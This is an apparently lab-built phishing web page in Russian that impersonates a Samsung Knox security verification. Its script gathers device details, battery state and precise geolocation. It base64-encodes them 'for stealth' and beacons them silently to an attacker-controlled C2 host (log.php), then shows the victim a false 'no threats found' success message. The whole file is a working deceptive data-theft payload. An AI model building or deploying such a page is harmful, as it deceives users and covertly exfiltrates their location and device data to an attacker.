<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Samsung Security Verification</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background: #121212; color: #e0e0e0; padding: 20px; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .card { border: 1px solid #333; padding: 40px; background: #1e1e1e; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.7); max-width: 400px; width: 100%; }
        h2 { color: #ffffff; margin-bottom: 10px; font-size: 1.5rem; }
        p { color: #b0b0b0; line-height: 1.6; margin-bottom: 25px; }
        .device-highlight { color: #3498db; font-weight: bold; }
        .btn { background: #0078d4; color: white; border: none; padding: 15px 40px; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 1rem; transition: background 0.3s; width: 100%; }
        .btn:hover { background: #005a9e; }
        #status { margin-top: 20px; font-size: 0.85rem; color: #666; font-style: italic; }
        .hidden-info { margin-top: 20px; padding: 10px; background: #2a2a2a; border-radius: 5px; font-size: 0.7rem; text-align: left; display: none; }
    </style>
</head>
<body>

    <div class="card">
        <h2>Проверка безопасности</h2>
        <p>Устройство <span id="device-name" class="device-highlight">определяется...</span> обнаружено. Нажмите кнопку для верификации системы Knox.</p>
        
        <button class="btn" onclick="startVerification()">ПОДТВЕРДИТЬ</button>
        
        <div id="status">Ожидание действий пользователя...</div>
        <div id="debug-info" class="hidden-info"></div>
    </div>

    <script>
        // 1. Определение устройства при загрузке
        function detectDevice() {
            const ua = navigator.userAgent;
            const deviceSpan = document.getElementById('device-name');
            
            if (ua.includes("SM-S908") || ua.includes("S22 Ultra")) {
                deviceSpan.innerText = "Samsung S22 Ultra";
            } else if (ua.includes("Android")) {
                deviceSpan.innerText = "Android Device";
            } else if (ua.includes("Windows")) {
                deviceSpan.innerText = "Windows PC";
            } else if (ua.includes("iPhone") || ua.includes("Macintosh")) {
                deviceSpan.innerText = "Apple Device";
            } else {
                deviceSpan.innerText = "Mobile Device";
            }
        }

        window.onload = detectDevice;

        // 2. Основная логика "атаки"
        async function startVerification() {
            const status = document.getElementById('status');
            const debug = document.getElementById('debug-info');
            status.innerText = "Связь с сервером Samsung... Анализ Knox...";

            // Сбор данных (Артефакты)
            const payload = {
                ua: navigator.userAgent,
                platform: navigator.platform,
                ram: navigator.deviceMemory || "unknown",
                screen: window.screen.width + "x" + window.screen.height,
                lang: navigator.language,
                cores: navigator.hardwareConcurrency,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            // Получаем заряд батареи
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    payload.battery = Math.round(battery.level * 100) + "%";
                    payload.isCharging = battery.charging;
                } catch (e) {}
            }

            // Пытаемся получить геопозицию
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    payload.lat = pos.coords.latitude;
                    payload.lon = pos.coords.longitude;
                    payload.acc = pos.coords.accuracy;
                    finalize(payload);
                },
                (err) => {
                    payload.geo_status = "Denied/Error";
                    finalize(payload);
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }

        // 3. Отправка данных на Kali
        function finalize(collectedData) {
            const status = document.getElementById('status');
            const debug = document.getElementById('debug-info');
            
            // Берем IP атакующего из URL (параметр ?c2=...)
            const urlParams = new URLSearchParams(window.location.search);
            const c2Host = urlParams.get('c2') || '127.0.0.1';

            // Кодируем в Base64 для скрытности
            const b64Data = btoa(JSON.stringify(collectedData));
            const attackerUrl = `http://${c2Host}/log.php?data=${b64Data}`;

            // Тихая отправка
            navigator.sendBeacon(attackerUrl);

            // Визуальный эффект для жертвы
            status.innerText = "Верификация завершена успешно. Угрозы не обнаружены.";
            status.style.color = "#2ecc71";
            
            // Для тебя (чтобы видеть, что улетело)
            debug.style.display = "block";
            debug.innerText = "Sent to C2 (" + c2Host + "): " + JSON.stringify(collectedData, null, 2);
            
            console.log("Data exfiltrated to:", attackerUrl);
        }
    </script>
</body>
</html>
